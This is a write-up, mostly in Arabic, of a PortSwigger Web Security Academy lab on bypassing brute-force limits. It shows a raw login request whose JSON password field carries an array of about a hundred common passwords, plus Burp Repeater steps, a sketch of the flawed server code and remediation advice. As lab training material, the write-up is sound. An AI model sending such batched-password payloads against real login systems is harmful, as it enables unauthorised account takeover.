# Lab : Broken brute - force protection , multiple credentials per request

https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

- الفكره من الLab ده ان معاك username و المفروض تعمل brute force علي الpassword  بس هو عامل limit علي اي 3 عمليات غلط حتي لو فيها فواصل ال**credentials** صح  فا في طريقه للbypass من اسم الlab الاوهي الlab بيقبل تبعت password array بس متنفعش في الusername  فا تعمل اكتر من password في شكل array وهو ينقي الصح بقا 😂

```bash
1. POST /login HTTP/2
Host: 0a4f006603b426ff80b5ee4a00de0085.web-security-academy.net
Cookie: session=6uLYoIvWzQDacMdfJlYcuVnjXQx1E02A
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4f006603b426ff80b5ee4a00de0085.web-security-academy.net/login
Content-Type: application/json
Content-Length: 1382
Origin: https://0a4f006603b426ff80b5ee4a00de0085.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"username":"carlos","password":["montoya", "123456",
  "12345678",
  "qwerty",
  "123456789",
  "12345",
  "1234",
  "111111",
  "1234567",
  "dragon",
  "123123",
  "baseball",
  "abc123",
  "football",
  "monkey",
  "letmein",
  "shadow",
  "master",
  "666666",
  "qwertyuiop",
  "123321",
  "mustang",
  "1234567890",
  "michael",
  "654321",
  "superman",
  "1qaz2wsx",
  "7777777",
  "121212",
  "000000",
  "qazwsx",
  "123qwe",
  "killer",
  "trustno1",
  "jordan",
  "jennifer",
  "zxcvbnm",
  "asdfgh",
  "hunter",
  "buster",
  "soccer",
  "harley",
  "batman",
  "andrew",
  "tigger",
  "sunshine",
  "iloveyou",
  "2000",
  "charlie",
  "robert",
  "thomas",
  "hockey",
  "ranger",
  "daniel",
  "starwars",
  "klaster",
  "112233",
  "george",
  "computer",
  "michelle",
  "jessica",
  "pepper",
  "1111",
  "zxcvbn",
  "555555",
  "11111111",
  "131313",
  "freedom",
  "777777",
  "pass",
  "maggie",
  "159753",
  "aaaaaa",
  "ginger",
  "princess",
  "joshua",
  "cheese",
  "amanda",
  "summer",
  "love",
  "ashley",
  "nicole",
  "chelsea",
  "biteme",
  "matthew",
  "access",
  "yankees",
  "987654321",
  "dallas",
  "austin",
  "thunder",
  "taylor",
  "matrix",
  "mobilemail",
  "mom",
  "monitor",
  "monitoring",
  "montana",
  "moon",
  "moscow"
  ]}
```

اللاب ده من فئة **Broken brute-force protection**، بس هنا الاستغلال مختلف تمامًا عن كل اللابات السابقة — المشكلة إن السيرفر بيقبل الـ login request بصيغة **JSON**، وبيسمح إن قيمة الـ `password` تبقى **Array (مصفوفة) من كذا باسورد بدل string واحد**، وبيعتبر تسجيل الدخول ناجح لو **أي واحد** من الباسوردات دي كان صح — كل ده في **request واحد بس**.

### طبيعة الثغرة (الـ Logic Flaw)

آلية الحماية من brute-force العادية (زي IP block أو Account lock) بتعتمد على **عدّ عدد المحاولات (requests)**. لو النظام بيعد "محاولة" لكل **request كامل** (مش لكل باسورد بيتجرب)، فتقدر:

json

```json
{  "username": "carlos",  "password": ["123456", "password", "qwerty", "abc123", ...]}
```

وتبعت **كل الباسوردات المرشحة دفعة واحدة في request واحد بس**. السيرفر لو مصمم بطريقة ساذجة بيتحقق من كل عنصر في الـ array لحد ما يلاقي واحد صح، ويرجع نجاح — وبما إنه request واحد فعليًا، **عداد المحاولات الفاشلة بيتزود مرة واحدة بس (أو ولا مرة لو نجح)**، فمفيش أي قفل أو حظر بيتفعل خالص، رغم إنك فعليًا جربت مئات الباسوردات.

### خطوات الحل بالتفصيل

#### 1. افحص صيغة الريكوست

جرب تسجل دخول عادي (بأي بيانات)، وشوف الـ `POST /login` request في Burp — هتلاحظ إنه بصيغة JSON:

json

```json
{  "username": "wiener",  "password": "peter"}
```

ابعت الريكوست ده على **Burp Repeater**.

#### 2. حوّل قيمة الـ password لـ Array

في Repeater، عدّل الـ body كده:

json

```json
{  "username": "carlos",  "password": ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]}
```

غيّرت الـ `username` لـ `carlos`، وحطيت كل الباسوردات المرشحة كـ array بدل string واحد.

#### 3. ابعت الريكوست

لو الثغرة موجودة، السيرفر هيتحقق من كل باسورد في الـ array لحد ما يلاقي واحد صح منهم، ولو لقى واحد صح، هيرجع **`302` (Redirect)** — يعني تسجيل دخول ناجح — كل ده من request واحد بس.

#### 4. افتح الـ Response في المتصفح

كليك يمين على الريكوست في Repeater واختار **"Show response in browser"**. Burp هيديك رابط، انسخه وافتحه في المتصفح — هتلاقي نفسك **مسجل دخول فعليًا بحساب carlos**.

#### 5. افتح My Account

دوس على **"My account"**، واللاب هيتحل تلقائيًا ✅.

### ليه ده بيحصل تقنيًا

الكود بيكون شبه كده (المشكلة):

python

```python
@app.route("/login", methods=["POST"])def login():    data = request.get_json()    username = data.get("username")    passwords = data.get("password")   # ممكن يكون string أو array!    if isinstance(passwords, str):        passwords = [passwords]    increment_login_attempt_counter(ip_address)   # ❌ بيتزود مرة واحدة بس للـ request كله    for pwd in passwords:   # ❌ بيلف على كل باسورد في نفس الـ request        if check_password(username, pwd):            login_user(username)            return redirect("/my-account"), 302    return "Invalid credentials", 401
```

المشكلة الجوهرية: **عداد الحماية من brute-force بيحسب عدد الـ requests، مش عدد محاولات الباسورد الفعلية**. بما إن السيرفر (بسبب مرونة JSON) بيقبل **array بدل string واحد**، وبيتحقق من كل عنصر فيها، أصبح تقدر "تكدّس" مئات محاولات الباسورد في **request واحد بس يتحسب كمحاولة وحيدة**، فتتخطى أي حد أقصى لعدد المحاولات (زي 3 محاولات) مهما كان.

### الدرس المستفاد

- **التحقق من نوع البيانات (type validation) في الـ backend أساسي جدًا** — لازم السيرفر يتأكد إن `password` **لازم تكون string وبس**، ويرفض أي قيمة تانية (array, object, إلخ) بدل ما "يتساهل" ويقبلها ويتعامل معاها.
- **آليات الحماية من brute-force لازم تعدّ عدد "محاولات الباسورد الفعلية"**، مش عدد الـ HTTP requests — الفرق ده بالظبط هو اللي فتح الثغرة هنا.
- أي **API بيقبل JSON** لازم يتفحص هيكل البيانات (schema validation) بدقة، لأن مرونة JSON (إمكانية إن أي حقل يبقى string أو array أو object) بتفتح احتمالات كتير غير متوقعة لو الكود بيتعامل معاها بشكل ساذج (زي `for pwd in passwords`).
- ده مثال ممتاز على إزاي **منطق برمجي "ذكي" أو "مرن" زيادة عن اللزوم** (قبول array بدل string واحد) ممكن يتحول لثغرة أمنية خطيرة، حتى لو الهدف الأصلي منه (يمكن تسهيل استخدام الـ API) كان بريء.
- الحل الصحيح: رفض أي request فيه `password` مش من نوع string واحد بشكل صريح، بالإضافة لعدّ المحاولات **قبل** عملية التحقق نفسها مش بعدها.
